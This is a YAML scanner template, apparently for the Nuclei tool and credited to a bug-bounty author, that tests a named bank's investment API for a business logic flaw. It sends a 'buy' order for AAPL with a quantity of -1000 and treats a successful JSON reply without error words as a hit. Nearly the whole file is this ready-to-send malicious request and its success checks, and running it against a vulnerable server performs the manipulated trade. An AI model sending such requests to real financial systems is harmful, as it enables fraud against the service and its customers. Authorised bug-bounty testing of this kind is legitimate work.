id: tinkoff-business-logic

info:
  name: Tinkoff - Business Logic Flaws
  author: bugbounty
  severity: critical
  description: Business logic flaws in investment operations with negative values
  tags: business-logic,payment,tinkoff

http:
  - raw:
      - |
        POST /api/invest/portfolio/instruments/v2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"tickers":"AAPL","quantity":-1000,"action":"buy"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202

      - type: word
        part: content_type
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - '"status"?\s*:\s*"?(success|completed|approved|accepted)"?'
          - '"quantity"?\s*:\s*-\d+'
          - '"result"?\s*:\s*"?ok"?'
        condition: or

      - type: dsl
        dsl:
          - '!contains(body, "error")'
          - '!contains(body, "invalid")'
          - '!contains(body, "forbidden")'
        condition: and

    extractors:
      - type: json
        part: body
        json:
          - '.status'
          - '.quantity'
          - '.result'
